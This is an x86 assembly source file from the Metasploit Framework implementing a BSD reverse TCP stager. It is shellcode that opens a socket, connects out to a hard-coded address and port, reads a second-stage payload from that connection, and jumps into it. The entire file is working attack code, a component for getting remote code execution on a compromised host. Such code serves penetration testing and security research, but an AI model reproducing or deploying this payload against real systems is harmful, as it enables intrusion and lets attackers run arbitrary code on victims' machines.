;;
; 
;        Name: stager_sock_reverse
;   Qualities: Can Have Nulls
;   Platforms: BSD
;     Authors: skape <mmiller [at] hick.org>
;     Authors: vlad902 <vlad902 [at] gmail.com>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSD reverse TCP stager.
;
;        File descriptor in edi.
;
;;
BITS   32
GLOBAL main

main:

socket:
	push byte 97
	pop  eax
	cdq
	push edx
	inc  edx
	push edx
	inc  edx
	push edx
	push dword 0x0100007f
	int  0x80

connect:
	push dword 0xbfbf0210
	mov  ecx, esp
	push byte 0x10
	push ecx
	push eax
	push ecx
%ifdef FD_REG_EBX
	xchg eax, ebx
%else
	xchg eax, edi
%endif
	push byte 98
	pop  eax
	int  0x80

read:
	mov  al, 0x3
	mov  byte [ecx - 0x3], 0x10
	int  0x80
	ret
